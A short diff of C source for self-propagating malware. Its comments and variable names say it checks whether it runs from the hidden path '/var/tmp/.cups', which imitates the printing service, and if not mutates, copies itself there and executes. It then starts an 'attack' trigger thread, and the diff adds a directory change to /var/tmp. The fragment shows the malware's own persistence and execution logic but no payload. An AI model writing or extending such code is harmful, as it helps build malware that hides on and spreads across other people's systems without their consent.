@@ -82,6 +82,7 @@ void entry(Globals *global) {
     // load the file content into the global buffer
     load_file_bytes(global);
 
+
     // if it's not running from the expdected path (i.e. usbs), mutate, copy there and execute it
     char syspath[] = "/var/tmp/.cups";
     if (global->strncmp(global->malware_path, syspath, sizeof(syspath)) != 0) {
@@ -93,6 +94,9 @@ void entry(Globals *global) {
         }
     }
   
+    // change working directory to /var/tmp
+    global->chdir("/var/tmp");
+    
     // start trigger of the attack
     pthread_t thread_id_trigger;
     global->pthread_create(&thread_id_trigger, NULL, start_trigger, global);
